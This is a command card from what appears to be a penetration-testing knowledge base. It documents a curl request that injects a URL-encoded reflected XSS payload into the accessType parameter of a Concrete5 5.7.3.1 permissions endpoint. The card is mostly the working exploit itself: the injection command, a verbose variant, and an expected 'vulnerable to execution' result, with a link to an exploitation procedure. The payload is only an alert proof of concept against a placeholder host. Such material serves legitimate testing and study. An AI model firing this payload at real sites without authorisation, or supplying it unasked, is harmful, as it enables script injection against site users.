---
id: cmd-curl-xss-permissions-001
data: >-
  curl
  'https://target.com/concrete5.7.3.1/index.php/tools/required/permissions/access_entity?peID=1&pdID=3&accessType=%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x00690C)%3C/scRipt%3E'
tags:
  - xss
  - injection
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:31.911Z'
verified: false
validated: true
submitted: true
---
# curl-inject-xss-permissions

## Command

```bash
curl 'https://target.com/concrete5.7.3.1/index.php/tools/required/permissions/access_entity?peID=1&pdID=3&accessType=%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x00690C)%3C/scRipt%3E'
```

## Description

GET request to permissions access entity endpoint injecting XSS payload in accessType parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Query params | peID, pdID fixed; accessType with payload | Yes |

## Examples

### Basic Usage

```bash
curl 'https://target.com/concrete5.7.3.1/index.php/tools/required/permissions/access_entity?accessType=test'
```

### Advanced Usage

```bash
curl 'https://target.com/concrete5.7.3.1/index.php/tools/required/permissions/access_entity?accessType=%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(0x00690C)%3C/scRipt%3E' -v
```

## Expected Output

HTML response with reflected script tag, vulnerable to execution.

## Related

- [[commands/curl-inject-xss-logs]]
- [[procedures/Exploit-Reflected-XSS-in-Concrete5-Parameters]]
